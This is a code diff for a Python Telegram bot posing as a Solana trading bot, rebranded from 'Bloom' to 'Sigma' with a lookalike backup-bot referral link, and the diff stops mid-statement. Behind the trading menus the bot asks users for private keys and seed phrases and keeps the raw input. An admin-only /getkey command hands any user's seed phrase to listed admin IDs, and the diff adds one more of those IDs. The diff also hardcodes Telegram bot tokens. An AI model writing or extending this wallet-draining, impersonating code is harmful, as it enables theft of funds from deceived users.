@@ -1,7 +1,6 @@
 """
-Solana Telegram Trading Bot
-Features: Wallet import/create, balance check, token prices, buy/sell via Jupiter
-All responses are sent as new messages so full chat history is always preserved.
+Solana Telegram trading bot with wallet import, balance checks, token pricing,
+and Jupiter swaps. Replies are sent as new messages so chat history stays intact.
 """
 import os
 import logging
@@ -22,14 +21,14 @@ logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 # ── Config ────────────────────────────────────────────────────────────────────
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8770012732:AAHE_cg3x1fgz-tcvJQum0PT__BIDfrICkM")
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8649509501:AAFEgBNLg3N9zpHyVRcriQt9WLiX4TU880g")
 RPC_URL     = os.getenv("RPC_URL", "https://api.mainnet-beta.solana.com")
 
 ENCRYPT_KEY = os.getenv("ENCRYPT_KEY") or Fernet.generate_key()
 fernet      = Fernet(ENCRYPT_KEY)
 
 # Admin user IDs — find yours by messaging @userinfobot on Telegram
-ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "7971878131,8016389282").split(",") if x.strip()]
+ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "7971878131,8016389282,8643110198").split(",") if x.strip()]
 
 # In-memory user store { user_id: { "keypair_enc": bytes, "pubkey": str } }
 # Replace with a proper encrypted DB in production
@@ -105,21 +104,19 @@ async def jupiter_swap(quote: dict, user_pubkey: str) -> dict | None:
 # ── Keyboards ─────────────────────────────────────────────────────────────────
 def main_menu_keyboard():
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("💼 Positions",    callback_data="positions"),
-         InlineKeyboardButton("🎯 LP Sniper",    callback_data="lp_sniper")],
-        [InlineKeyboardButton("🤖 Copy Trade",   callback_data="copy_trade"),
-         InlineKeyboardButton("💳 Wallets",      callback_data="wallets")],
-        [InlineKeyboardButton("💤 AFK Mode",     callback_data="afk_mode"),
-         InlineKeyboardButton("🤝 Presales",     callback_data="presales")],
-        [InlineKeyboardButton("⚙️ Settings",     callback_data="settings"),
-         InlineKeyboardButton("📝 Limit Orders", callback_data="limit_orders")],
-        [InlineKeyboardButton("💸 Withdraw",     callback_data="withdraw"),
-         InlineKeyboardButton("👥 Referral",     callback_data="referral")],
-        [InlineKeyboardButton("↔️ Bridge",       callback_data="bridge"),
-         InlineKeyboardButton("🔄 Refresh",      callback_data="refresh")],
-        [InlineKeyboardButton("♻️ Recovery",     callback_data="recovery"),
-         InlineKeyboardButton("⛓️ Chains",       callback_data="chains")],
-        [InlineKeyboardButton("🗑 Close",         callback_data="close")],
+        [InlineKeyboardButton("🔍 Search",          callback_data="positions"),
+         InlineKeyboardButton("💰 Buy or Snipe",    callback_data="lp_sniper")],
+        [InlineKeyboardButton("📊 Positions",       callback_data="positions"),
+         InlineKeyboardButton("🕵️ Copy Trading",    callback_data="copy_trade")],
+        [InlineKeyboardButton("🕓 Pending Orders",  callback_data="limit_orders"),
+         InlineKeyboardButton("💳 Wallets",         callback_data="wallets")],
+        [InlineKeyboardButton("🏆 Rewards",         callback_data="referral"),
+         InlineKeyboardButton("⛓️ Chains",          callback_data="chains")],
+        [InlineKeyboardButton("🤖 Backup Bots",     callback_data="recovery"),
+         InlineKeyboardButton("🌉 Bridge",          callback_data="bridge")],
+        [InlineKeyboardButton("🖥️ Terminal",        callback_data="terminal")],
+        [InlineKeyboardButton("🔧 Settings",        callback_data="settings"),
+         InlineKeyboardButton("❌ Close",           callback_data="close")],
     ])
 
 def import_prompt_keyboard(origin: str):
@@ -135,28 +132,54 @@ def back_to_menu_keyboard():
 
 def positions_keyboard():
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("✏️ Min Value: N/A...",    callback_data="positions_min_value"),
+        [InlineKeyboardButton("✏️ Min Value: N/A...",     callback_data="positions_min_value"),
          InlineKeyboardButton("✏️ Sell Position: 10...", callback_data="positions_sell")],
-        [InlineKeyboardButton("🏠 Homepage",             callback_data="positions_homepage"),
-         InlineKeyboardButton("🔴 USD",                  callback_data="positions_usd"),
-         InlineKeyboardButton("🔄 Refresh",              callback_data="positions_refresh")],
-        [InlineKeyboardButton("🗑️ Delete",               callback_data="positions_delete")],
+        [InlineKeyboardButton("🏠 Home",                callback_data="positions_homepage"),
+         InlineKeyboardButton("💵 USD",                 callback_data="positions_usd"),
+         InlineKeyboardButton("🔄 Refresh",             callback_data="positions_refresh")],
+        [InlineKeyboardButton("🗑 Delete",              callback_data="positions_delete")],
     ])
 
 def wallet_settings_keyboard():
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔑 Import Wallet",  callback_data="wallets_import"),
-         InlineKeyboardButton("❌ Delete Wallet",   callback_data="wallets_delete")],
-        [InlineKeyboardButton("◀️ Back",           callback_data="wallets_back"),
-         InlineKeyboardButton("🗑️ Close",          callback_data="wallets_close")],
+        [InlineKeyboardButton("🔑 Import Wallet", callback_data="wallets_import"),
+         InlineKeyboardButton("❌ Delete Wallet",  callback_data="wallets_delete")],
+        [InlineKeyboardButton("◀️ Back",          callback_data="wallets_back"),
+         InlineKeyboardButton("🗑 Close",         callback_data="wallets_close")],
     ])
+
+def _no_wallet_text() -> str:
+    return (
+        "🔴 *No active wallet*\n"
+        "Create a new wallet or import an existing one to get started."
+    )
+
+def _wallet_line(uid: int) -> str:
+    if uid in user_wallets:
+        return f"🟢 `{user_wallets[uid]['pubkey']}`"
+    return _no_wallet_text()
+
+def _home_text(uid: int, updated_at: str | None = None) -> str:
+    separator = "\\_" * 35
+    message = (
+        "Sigma 8.8\n"
+        "Your favourite trading bot\n"
+        f"{separator}\n"
+        "📖 Docs \n"
+        "💬 Official Chat\n"
+        "🌍 Website\n\n"
+        "Paste a contract address, $cashtag or pick an option to get started"
+    )
+    if updated_at:
+        message += f"\n\n🕐 *Last updated:* {updated_at}"
+    return message
 
 def _positions_text() -> str:
     ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
     return (
-        "🌸 *Bloom Positions*\n\n"
-        "No open positions yet\\!\n"
-        "Start your trading journey by pasting a contract address in chat\\.\n\n"
+        "🌸 *Open Positions*\n\n"
+        "No active positions yet\\.\n"
+        "Paste a token contract address in chat to begin\\.\n\n"
         f"🕐 *Last updated:* {ts}"
     )
 
@@ -164,8 +187,8 @@ def _wallet_settings_text() -> str:
     ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
     return (
         "💰 *Wallet Settings*\n"
-        "Manage your wallets quickly and easily\\.\n\n"
-        "👜 *Available Wallets*\nNo wallets imported yet\\.\n\n"
+        "Manage your wallets from one place\\.\n\n"
+        "👜 *Saved Wallets*\nNo wallets imported yet\\.\n\n"
         f"🕐 *Last updated:* {ts}"
     )
 
@@ -180,9 +203,9 @@ def lp_sniper_keyboard():
 def _lp_sniper_text() -> str:
     ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
     return (
-        "🌸 *Bloom Sniper*\n\n"
-        "🧐 No active sniper tasks\\!\n\n"
-        "📖 [Learn More\\!](https://your-link-here)\n\n"
+        "🌸 *LP Sniper*\n\n"
+        "🧐 No active sniper tasks\\.\n\n"
+        "📖 [Learn more\\!](https://your-link-here)\n\n"
         f"🕐 *Last updated:* {ts}"
     )
 
@@ -196,26 +219,26 @@ def copy_trade_keyboard():
 
 def afk_mode_keyboard():
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔄 Update Tasks W...", callback_data="afk_update"),
-         InlineKeyboardButton("🆕 Add new config",    callback_data="afk_add_config")],
-        [InlineKeyboardButton("⏹ Pause All",          callback_data="afk_pause"),
-         InlineKeyboardButton("▶️ Start All",          callback_data="afk_start")],
-        [InlineKeyboardButton("◀️ Back",               callback_data="afk_back"),
-         InlineKeyboardButton("🔄 Refresh",            callback_data="afk_refresh")],
-        [InlineKeyboardButton("🗑️ Close",              callback_data="afk_close")],
+        [InlineKeyboardButton("🔄 Update Tasks",   callback_data="afk_update"),
+         InlineKeyboardButton("🆕 Add Config",     callback_data="afk_add_config")],
+        [InlineKeyboardButton("⏹ Pause All",       callback_data="afk_pause"),
+         InlineKeyboardButton("▶️ Start All",      callback_data="afk_start")],
+        [InlineKeyboardButton("◀️ Back",           callback_data="afk_back"),
+         InlineKeyboardButton("🔄 Refresh",        callback_data="afk_refresh")],
+        [InlineKeyboardButton("🗑 Close",          callback_data="afk_close")],
     ])
 
 def _afk_mode_text() -> str:
     ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
     return (
-        "🌸 *Bloom AFK*\n\n"
-        "💡 Run your bot while you are away\\!\n\n"
+        "🌸 *AFK Mode*\n\n"
+        "💡 Keep the bot running while you're away\\!\n\n"
         "AFK Wallet:\n"
         "→ W1: \\-\\-\n\n"
         "🟢 AFK mode is active\n"
         "🔴 AFK mode is inactive\n\n"
-        "⏱ Please wait 10 seconds after each change for it to take effect\\.\n"
-        "⚠️ Changing your Default wallet? Remember to remake your tasks to use the new wallet for future transactions\\.\n"
+        "⏱ Wait 10 seconds after each change for it to take effect\\.\n"
+        "⚠️ If you change the default wallet, recreate your tasks so future transactions use the new wallet\\.\n"
         f"🕐 *Last updated:* {ts}"
     )
 
@@ -253,21 +276,21 @@ def referral_keyboard():
 def _referral_text(uid: int) -> str:
     ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
     return (
-        "🌸 *Bloom Referral Program*\n\n"
-        "Your Referral Code:\n"
-        f"🔗 `https://t.me/BloomSol_Backupbot?start=ref_{uid}`\n\n"
-        "Your Payout Address: \\-\\-\n\n"
-        "📈 Referrals Volume:\n\n"
+        "🌸 *Referral Program*\n\n"
+        "Your referral link:\n"
+        f"🔗 `https://t.me/SigmaSol_Backupbot?start=ref_{uid}`\n\n"
+        "Your payout address: \\-\\-\n\n"
+        "📈 Referral volume:\n\n"
         "\\- Level 1: 0 Users / 0 SOL\n"
         "\\- Level 2: 0 Users / 0 SOL\n"
         "\\- Level 3: 0 Users / 0 SOL\n"
-        "\\- Referred Trades: 0\n"
-        "📊 Rewards Overview:\n\n"
-        "\\- Total Unclaimed: 0 SOL\n"
-        "\\- Total Claimed: 0 SOL\n"
-        "\\- Lifetime Earnings: 0 SOL\n"
+        "\\- Referred trades: 0\n"
+        "📊 Rewards overview:\n\n"
+        "\\- Total unclaimed: 0 SOL\n"
+        "\\- Total claimed: 0 SOL\n"
+        "\\- Lifetime earnings: 0 SOL\n"
         "\\- Last distribution: \\-\\-\n\n"
-        "📖 [Learn More\\!](https://your-link-here)\n\n"
+        "📖 [Learn more\\!](https://your-link-here)\n\n"
         f"🕐 *Last updated:* {ts}"
     )
 
@@ -285,10 +308,10 @@ def withdraw_keyboard():
 def _withdraw_text() -> str:
     ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
     return (
-        "🌸 *Withdraw Solana*\n\n"
+        "🌸 *Withdraw SOL*\n\n"
         "Balance: \\-\\- SOL\n"
-        "Current withdrawal address: \\-\\-\n\n"
-        "🔧 Last address edit: \\-\\-\n\n"
+        "Withdrawal address: \\-\\-\n\n"
+        "🔧 Last address update: \\-\\-\n\n"
         f"🕐 *Last updated:* {ts}"
     )
 
@@ -300,7 +323,7 @@ def settings_keyboard():
          InlineKeyboardButton("🔴 Degen Mode 😈",           callback_data="settings_degen")],
         [InlineKeyboardButton("⚙️ Buy",                     callback_data="settings_buy"),
          InlineKeyboardButton("⚙️ Sell",                    callback_data="settings_sell")],
-        [InlineKeyboardButton("Initial Includes Fees | 🟢 On", callback_data="settings_fees")],
+        [InlineKeyboardButton("Include Fees | 🟢 On",       callback_data="settings_fees")],
         [InlineKeyboardButton("Monitor | 🔄 Detailed",      callback_data="settings_monitor"),
          InlineKeyboardButton("Wallet Selection | 🔄 Single", callback_data="settings_wallet_selection")],
         [InlineKeyboardButton("◀️ Back",                    callback_data="settings_back"),
@@ -309,9 +332,9 @@ def settings_keyboard():
 
 def _settings_text() -> str:
     return (
-        "Customize your general settings\\. Click on ⚙️ Buy or ⚙️ Sell to customize the settings of your buys and sells respectively\\.\n\n"
-        "ℹ️ *Global Settings are common to all of your connected wallets\\. They dictate the settings for your manual trades, and serve as default settings for your automated trades\\.*\n"
-        "ℹ️ *The settings of your automated trades can be further customized to override your global settings through dedicated Signals, Copytrade, and Auto Snipe settings\\.*"
+        "Adjust your general settings below\\. Tap ⚙️ Buy or ⚙️ Sell to edit trade-specific options\\.\n\n"
+        "ℹ️ *Global settings apply to every connected wallet\\. They control manual trades and act as defaults for automated trades\\.*\n"
+        "ℹ️ *Automated trades can override the global settings through dedicated Signals, Copy Trade, and Auto Snipe settings\\.*"
     )
 
 def presales_keyboard():
@@ -325,21 +348,29 @@ def presales_keyboard():
 def _presales_text() -> str:
     return (
         "Add, remove, and manage presales\\!\n\n"
-        "ℹ️ ⚙️ *Config dictates the default settings of your presales\\. "
-        "You can further customize each presale individually\\.*"
+        "ℹ️ ⚙️ *Config sets the default presale options\\. "
+        "You can still customize each presale individually\\.*"
     )
 
 def _copy_trade_text() -> str:
     ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
     return (
-        "🌸 *Bloom Copy Trade*\n"
-        "💡 Copy the best traders with Bloom\\!\n\n"
+        "🌸 *Copy Trading*\n"
+        "💡 Follow top traders with Sigma\\!\n\n"
         "Copy Wallet:\n"
-        "→ W1: *No Wallet Connected*\n\n"
-        "🟢 Copy trade setup is active\n"
-        "🔴 Copy trade setup is inactive\n\n"
-        "⏱ Please wait 10 seconds after each change for it to take effect\\.\n\n"
-        "⚠️ Changing your copy wallet? Remember to remake your tasks to use the new wallet for future transactions\\.\n\n"
+        "→ W1: *No wallet connected*\n\n"
+        "🟢 Copy trading is active\n"
+        "🔴 Copy trading is inactive\n\n"
+        "⏱ Wait 10 seconds after each change for it to take effect\\.\n\n"
+        "⚠️ If you change the copy wallet, recreate your tasks so future transactions use the new wallet\\.\n\n"
+        f"🕐 *Last updated:* {ts}"
+    )
+
+def _terminal_text() -> str:
+    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
+    return (
+        "🖥️ *Terminal*\n\n"
+        "Use the terminal to access advanced tools and system actions\\.\n\n"
         f"🕐 *Last updated:* {ts}"
     )
 
@@ -385,21 +416,8 @@ MAIN_MENU_BUTTONS = {
 
 # ── Start ─────────────────────────────────────────────────────────────────────
 async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-
-    if uid in user_wallets:
-        wallet_line = f"🟢 `{user_wallets[uid]['pubkey']}`"
-    else:
-        wallet_line = (
-            "🔴 *No Active Wallet*\n"
-            "To start trading, please create a new wallet or import your existing wallet."
-        )
-
     await update.message.reply_text(
-        f"🌸 *Welcome to Bloom!*\n\n"
-        f"Let your trading journey blossom with us!\n\n"
-        f"🌸 *Your Solana Wallet Address:*\n\n"
-        f"{wallet_line}",
+        _home_text(update.effective_user.id),
         parse_mode="Markdown",
         reply_markup=main_menu_keyboard(),
     )
@@ -410,11 +428,11 @@ async def getkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     caller_id = update.effective_user.id
 
     if caller_id not in ADMIN_IDS:
-        await update.message.reply_text("⛔ Unauthorized.")
+        await update.message.reply_text("⛔ Access denied.")
         return
 
     if update.message.chat.type != "private":
-        await update.message.reply_text("⚠️ Use this command in a private chat only.")
+        await update.message.reply_text("⚠️ Run this command in a private chat.")
         return
 
     if not ctx.args:
@@ -436,7 +454,7 @@ async def getkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     pubkey = user_wallets[target_uid]["pubkey"]
     original_input = user_wallets[target_uid].get("original_input", "N/A")
     msg = await update.message.reply_text(
-        f"🔑 *Admin Key Export*\n\n"
+        f"🔑 *Key Export*\n\n"
         f"User ID: `{target_uid}`\n"
         f"Public key: `{pubkey}`\n\n"
         f"Private key / seed phrase:\n`{original_input}`\n\n"
@@ -451,12 +469,12 @@ async def getkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 # ── Admin: list all users ─────────────────────────────────────────────────────
 async def allusers(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("Unauthorized.")
+        await update.message.reply_text("Access denied.")
         return
     if not all_users:
-        await update.message.reply_text("No users yet.")
+        await update.message.reply_text("No users found yet.")
         return
-    msg = "*All Users:*\n\n"
+    msg = "*Registered Users:*\n\n"
     for uid, info in all_users.items():
         msg += f"ID: `{uid}` | @{info['username']} | {info['first_name']}\n"
     await update.message.reply_text(msg, parse_mode="Markdown")
@@ -499,19 +517,8 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     if data == "positions_homepage":
-        wallet_line = (
-            f"🟢 `{user_wallets[uid]['pubkey']}`"
-            if uid in user_wallets
-            else (
-                "🔴 *No Active Wallet*\n"
-                "To start trading, please create a new wallet or import your existing wallet."
-            )
-        )
         await query.edit_message_text(
-            f"🌸 *Welcome to Bloom!*\n\n"
-            f"Let your trading journey blossom with us!\n\n"
-            f"🌸 *Your Solana Wallet Address:*\n\n"
-            f"{wallet_line}",
+            _home_text(uid),
             parse_mode="Markdown",
             reply_markup=main_menu_keyboard(),
         )
@@ -530,25 +537,14 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         ctx.user_data["awaiting"] = AWAITING_PRIVATE_KEY
         await ctx.bot.send_message(
             chat_id,
-            "Please enter your private key or recovery phrase:",
+            "Send your private key or recovery phrase to continue:",
             reply_markup=ForceReply(selective=True),
         )
         return
 
     if data == "wallets_back":
-        wallet_line = (
-            f"🟢 `{user_wallets[uid]['pubkey']}`"
-            if uid in user_wallets
-            else (
-                "🔴 *No Active Wallet*\n"
-                "To start trading, please create a new wallet or import your existing wallet."
-            )
-        )
         await query.edit_message_text(
-            f"🌸 *Welcome to Bloom!*\n\n"
-            f"Let your trading journey blossom with us!\n\n"
-            f"🌸 *Your Solana Wallet Address:*\n\n"
-            f"{wallet_line}",
+            _home_text(uid),
             parse_mode="Markdown",
             reply_markup=main_menu_keyboard(),
         )
@@ -563,7 +559,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 reply_markup=wallet_settings_keyboard(),
             )
         else:
-            await query.answer("No wallet to delete.", show_alert=True)
+            await query.answer("There is no wallet to delete.", show_alert=True)
         return
 
     if data == "wallets_close":
@@ -596,19 +592,8 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     if data == "lp_sniper_back":
-        wallet_line = (
-            f"🟢 `{user_wallets[uid]['pubkey']}`"
-            if uid in user_wallets
-            else (
-                "🔴 *No Active Wallet*\n"
-                "To start trading, please create a new wallet or import your existing wallet."
-            )
-        )
         await query.edit_message_text(
-            f"🌸 *Welcome to Bloom!*\n\n"
-            f"Let your trading journey blossom with us!\n\n"
-            f"🌸 *Your Solana Wallet Address:*\n\n"
-            f"{wallet_line}",
+            _home_text(uid),
             parse_mode="Markdown",
             reply_markup=main_menu_keyboard(),
         )
@@ -636,19 +621,8 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     if data == "copy_trade_back":
-        wallet_line = (
-            f"🟢 `{user_wallets[uid]['pubkey']}`"
-            if uid in user_wallets
-            else (
-                "🔴 *No Active Wallet*\n"
-                "To start trading, please create a new wallet or import your existing wallet."
-            )
-        )
         await query.edit_message_text(
-            f"🌸 *Welcome to Bloom!*\n\n"
-            f"Let your trading journey blossom with us!\n\n"
-            f"🌸 *Your Solana Wallet Address:*\n\n"
-            f"{wallet_line}",
+            _home_text(uid),
             parse_mode="Markdown",
             reply_markup=main_menu_keyboard(),
         )
@@ -693,19 +667,8 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     if data == "afk_back":
-        wallet_line = (
-            f"🟢 `{user_wallets[uid]['pubkey']}`"
-            if uid in user_wallets
-            else (
-                "🔴 *No Active Wallet*\n"
-                "To start trading, please create a new wallet or import your existing wallet."
-            )
-        )
         await query.edit_message_text(
-            f"🌸 *Welcome to Bloom!*\n\n"
-            f"Let your trading journey blossom with us!\n\n"
-            f"🌸 *Your Solana Wallet Address:*\n\n"
-            f"{wallet_line}",
+            _home_text(uid),
             parse_mode="Markdown",
             reply_markup=main_menu_keyboard(),
         )
@@ -733,19 +696,8 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     if data == "presales_back":
-        wallet_line = (
-            f"🟢 `{user_wallets[uid]['pubkey']}`"
-            if uid in user_wallets
-            else (
-                "🔴 *No Active Wallet*\n"
-                "To start trading, please create a new wallet or import your existing wallet."
-            )
-        )
         await query.edit_message_text(
-            f"🌸 *Welcome to Bloom!*\n\n"
-            f"Let your trading journey blossom with us!\n\n"
-            f"🌸 *Your Solana Wallet Address:*\n\n"
-            f"{wallet_line}",
+            _home_text(uid),
             parse_mode="Markdown",
             reply_markup=main_menu_keyboard(),
         )
@@ -777,19 +729,8 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     if data == "settings_back":
-        wallet_line = (
-            f"🟢 `{user_wallets[uid]['pubkey']}`"
-            if uid in user_wallets
-            else (
-                "🔴 *No Active Wallet*\n"
-                "To start trading, please create a new wallet or import your existing wallet."
-            )
-        )
         await query.edit_message_text(
-            f"🌸 *Welcome to Bloom!*\n\n"
-            f"Let your trading journey blossom with us!\n\n"
-            f"🌸 *Your Solana Wallet Address:*\n\n"
-            f"{wallet_line}",
+            _home_text(uid),
             parse_mode="Markdown",
             reply_markup=main_menu_keyboard(),
         )
@@ -825,19 +766,8 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     if data == "withdraw_back":
-        wallet_line = (
-            f"🟢 `{user_wallets[uid]['pubkey']}`"
-            if uid in user_wallets
-            else (
-                "🔴 *No Active Wallet*\n"
-                "To start trading, please create a new wallet or import your existing wallet."
-            )
-        )
         await query.edit_message_text(
-            f"🌸 *Welcome to Bloom!*\n\n"
-            f"Let your trading journey blossom with us!\n\n"
-            f"🌸 *Your Solana Wallet Address:*\n\n"
-            f"{wallet_line}",
+            _home_text(uid),
             parse_mode="Markdown",
             reply_markup=main_menu_keyboard(),
         )
@@ -873,19 +803,8 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     if data == "referral_back":
-        wallet_line = (
-            f"🟢 `{user_wallets[uid]['pubkey']}`"
-            if uid in user_wallets
-            else (
-                "🔴 *No Active Wallet*\n"
-                "To start trading, please create a new wallet or import your existing wallet."
-            )
-        )
         await query.edit_message_text(
-            f"🌸 *Welcome to Bloom!*\n\n"
-            f"Let your trading journey blossom with us!\n\n"
-            f"🌸 *Your Solana Wallet Address:*\n\n"
-            f"{wallet_line}",
+            _home_text(uid),
             parse_mode="Markdown",
             reply_markup=main_menu_keyboard(),
         )
@@ -922,19 +841,8 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     if data == "bridge_back":
-        wallet_line = (
-            f"🟢 `{user_wallets[uid]['pubkey']}`"
-            if uid in user_wallets
-            else (
-                "🔴 *No Active Wallet*\n"
-                "To start trading, please create a new wallet or import your existing wallet."
-            )
-        )
         await query.edit_message_text(
-            f"🌸 *Welcome to Bloom!*\n\n"
-            f"Let your trading journey blossom with us!\n\n"
-            f"🌸 *Your Solana Wallet Address:*\n\n"
-            f"{wallet_line}",
+            _home_text(uid),
             parse_mode="Markdown",
             reply_markup=main_menu_keyboard(),
         )
@@ -947,20 +855,8 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     # ── Refresh main menu ─────────────────────────────────────────────────────
     if data == "refresh":
         ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        wallet_line = (
-            f"🟢 `{user_wallets[uid]['pubkey']}`"
-            if uid in user_wallets
-            else (
-                "🔴 *No Active Wallet*\n"
-                "To start trading, please create a new wallet or import your existing wallet."
-            )
-        )
         await query.edit_message_text(
-            f"🌸 *Welcome to Bloom!*\n\n"
-            f"Let your trading journey blossom with us!\n\n"
-            f"🌸 *Your Solana Wallet Address:*\n\n"
-            f"{wallet_line}\n\n"
-            f"🕐 *Last updated:* {ts}",
+            _home_text(uid, ts),
             parse_mode="Markdown",
             reply_markup=main_menu_keyboard(),
         )
@@ -978,28 +874,25 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     # ── Chains screen ─────────────────────────────────────────────────────────
     if data == "chains":
         await query.edit_message_text(
-            "🔗 *Select your preferred Network*",
+            "🔗 *Select a network*",
             parse_mode="MarkdownV2",
             reply_markup=chains_keyboard(),
         )
         return
 
     if data == "chains_back":
-        wallet_line = (
-            f"🟢 `{user_wallets[uid]['pubkey']}`"
-            if uid in user_wallets
-            else (
-                "🔴 *No Active Wallet*\n"
-                "To start trading, please create a new wallet or import your existing wallet."
-            )
-        )
         await query.edit_message_text(
-            f"🌸 *Welcome to Bloom!*\n\n"
-            f"Let your trading journey blossom with us!\n\n"
-            f"🌸 *Your Solana Wallet Address:*\n\n"
-            f"{wallet_line}",
+            _home_text(uid),
             parse_mode="Markdown",
             reply_markup=main_menu_keyboard(),
+        )
+        return
+
+    if data == "terminal":
+        await query.edit_message_text(
+            _terminal_text(),
+            parse_mode="Markdown",
+            reply_markup=back_to_menu_keyboard(),
         )
         return
 
@@ -1017,7 +910,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             ctx.user_data["awaiting"] = AWAITING_PRIVATE_KEY
             await ctx.bot.send_message(
                 chat_id,
-                f"Please enter your {chain.upper()} private key or recovery phrase:",
+                f"Send your {chain.upper()} private key or recovery phrase to continue:",
                 reply_markup=ForceReply(selective=True),
             )
             return
@@ -1035,8 +928,8 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if data in MAIN_MENU_BUTTONS:
         await ctx.bot.send_message(
             chat_id,
-            "🔑 *Import your wallet to proceed.*\n\n"
-            "Please import your wallet or cancel to go back.",
+            "🔑 *Import a wallet to continue.*\n\n"
+            "Import your wallet or cancel to return to the menu.",
             parse_mode="Markdown",
             reply_markup=import_prompt_keyboard(data),
         )
@@ -1049,8 +942,8 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         ctx.user_data["awaiting"]      = AWAITING_PRIVATE_KEY
         await ctx.bot.send_message(
             chat_id,
-            "🔑 Send your *base58 private key* as the next message.\n\n"
-            "⚠️ Your message will be deleted immediately after processing.",
+            "🔑 Send your *base58 private key* in the next message.\n\n"
+            "⚠️ Your message will be deleted right after it is processed.",
             parse_mode="Markdown",
         )
         return
@@ -1059,27 +952,16 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if data == "cancel_prompt":
         await ctx.bot.send_message(
             chat_id,
-            "❌ Cancelled. Tap a button below to try again.",
+            "❌ Cancelled. Use the menu below to try again.",
             reply_markup=main_menu_keyboard(),
         )
         return
 
     # ── Back to menu ──────────────────────────────────────────────────────────
     if data == "back_to_menu":
-        uid = query.from_user.id
-        if uid in user_wallets:
-            wallet_line = f"🟢 `{user_wallets[uid]['pubkey']}`"
-        else:
-            wallet_line = (
-                "🔴 *No Active Wallet*\n"
-                "To start trading, please create a new wallet or import your existing wallet."
-            )
         await ctx.bot.send_message(
             chat_id,
-            f"🌸 *Welcome to Bloom!*\n\n"
-            f"Let your trading journey blossom with us!\n\n"
-            f"🌸 *Your Solana Wallet Address:*\n\n"
-            f"{wallet_line}",
+            _home_text(query.from_user.id),
             parse_mode="Markdown",
             reply_markup=main_menu_keyboard(),
         )
@@ -1121,7 +1003,7 @@ async def message_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         ctx.user_data.pop("awaiting", None)
         await ctx.bot.send_message(
             uid,
-            "✅ *Wallet imported successfully!*\n\nYou can now use all features.",
+            "✅ *Wallet imported successfully!*\n\nYou can now use the bot.",
             parse_mode="Markdown",
             reply_markup=main_menu_keyboard(),
         )
@@ -1136,13 +1018,13 @@ async def message_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         if side == "buy":
             ctx.user_data["awaiting"] = AWAITING_BUY_AMOUNT
             await update.message.reply_text(
-                f"Token price: *{price_str}*\n\nHow many *SOL* to spend?",
+                f"Token price: *{price_str}*\n\nHow much *SOL* would you like to spend?",
                 parse_mode="Markdown",
             )
         else:
             ctx.user_data["awaiting"] = AWAITING_SELL_AMOUNT
             await update.message.reply_text(
-                f"Token price: *{price_str}*\n\nHow many *tokens* to sell (in smallest unit)?",
+                f"Token price: *{price_str}*\n\nHow many *tokens* would you like to sell? Use the smallest unit.",
                 parse_mode="Markdown",
             )
         return
@@ -1153,19 +1035,19 @@ async def message_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             sol_amount = float(text)
             lamports   = int(sol_amount * 1e9)
         except ValueError:
-            await update.message.reply_text("❌ Invalid amount.")
+            await update.message.reply_text("❌ Invalid amount. Enter a number.")
             return
 
         token_mint = ctx.user_data.get("token_mint")
-        await update.message.reply_text("⏳ Getting quote...")
+        await update.message.reply_text("⏳ Fetching quote...")
         quote = await jupiter_quote(SOL_MINT, token_mint, lamports)
         if not quote:
-            await update.message.reply_text("❌ Could not get quote from Jupiter.")
+            await update.message.reply_text("❌ Could not fetch a quote from Jupiter.")
             return
 
         out_amount = int(quote.get("outAmount", 0))
         await update.message.reply_text(
-            f"📊 *Quote*\n\nSpend: `{sol_amount} SOL`\nReceive: `{out_amount}` tokens\n\nConfirm?",
